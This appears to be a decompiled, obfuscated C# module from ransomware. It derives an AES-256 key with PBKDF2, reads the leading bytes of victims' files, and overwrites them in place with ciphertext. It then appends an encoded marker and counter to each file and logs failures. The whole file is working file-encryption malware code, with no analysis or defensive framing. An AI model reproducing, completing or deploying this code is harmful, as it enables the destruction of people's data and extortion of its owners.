using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

public static class yCEUyCJExoD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] owLSycDbRtwE(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = impvlsYcUSRsy(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes impvlsYcUSRsy(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] witOdSQgZEAF(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (PHGJAOmKtxaSj.wZbEoAraGvmLvW == getString_0(107397011))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (PHGJAOmKtxaSj.pecnubHqkoHSu)
			{
				try
				{
					File.AppendAllText(PHGJAOmKtxaSj.EosKWorQtPTcF, getString_0(107357715) + string_0 + getString_0(107368332) + ex.Message + getString_0(107396804));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void WXbYHCDpfzLsa(string PgjBWuhlnzbqywd, byte[] UIHndRGPgVIPjSX, byte[] VMvMJaRScloWHayN = null)
	{
		try
		{
			byte[] array = null;
			if (PHGJAOmKtxaSj.wZbEoAraGvmLvW == getString_0(107397011))
			{
				array = (PHGJAOmKtxaSj.vGpYFLyMrFVXGy ? Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274))) : Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(PgjBWuhlnzbqywd, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(UIHndRGPgVIPjSX, 0, UIHndRGPgVIPjSX.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(PgjBWuhlnzbqywd, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PHGJAOmKtxaSj.vGpYFLyMrFVXGy)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(VMvMJaRScloWHayN, 0, VMvMJaRScloWHayN.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (PHGJAOmKtxaSj.vGpYFLyMrFVXGy ? Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274))) : Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315))));
				FileStream fileStream2 = new FileStream(PgjBWuhlnzbqywd, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(UIHndRGPgVIPjSX, 0, UIHndRGPgVIPjSX.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(PgjBWuhlnzbqywd, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PHGJAOmKtxaSj.vGpYFLyMrFVXGy)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(VMvMJaRScloWHayN, 0, VMvMJaRScloWHayN.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			PHGJAOmKtxaSj.cqVZtWdZmgC++;
		}
		catch (Exception ex)
		{
			if (PHGJAOmKtxaSj.pecnubHqkoHSu)
			{
				try
				{
					File.AppendAllText(PHGJAOmKtxaSj.EosKWorQtPTcF, getString_0(107357715) + PgjBWuhlnzbqywd + getString_0(107368265) + ex.Message + getString_0(107396804));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (PHGJAOmKtxaSj.vGpYFLyMrFVXGy ? Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368274))) : Encoding.ASCII.GetBytes(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(PHGJAOmKtxaSj.vmyhVfkopgG) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315)) + Convert.ToString(PHGJAOmKtxaSj.QJUrSnUbdYkijm) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368315))));
			FileStream fileStream4 = new FileStream(PgjBWuhlnzbqywd, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(UIHndRGPgVIPjSX, 0, UIHndRGPgVIPjSX.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(PgjBWuhlnzbqywd, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!PHGJAOmKtxaSj.vGpYFLyMrFVXGy)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(VMvMJaRScloWHayN, 0, VMvMJaRScloWHayN.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static yCEUyCJExoD()
	{
		Strings.CreateGetStringDelegate(typeof(yCEUyCJExoD));
	}
}
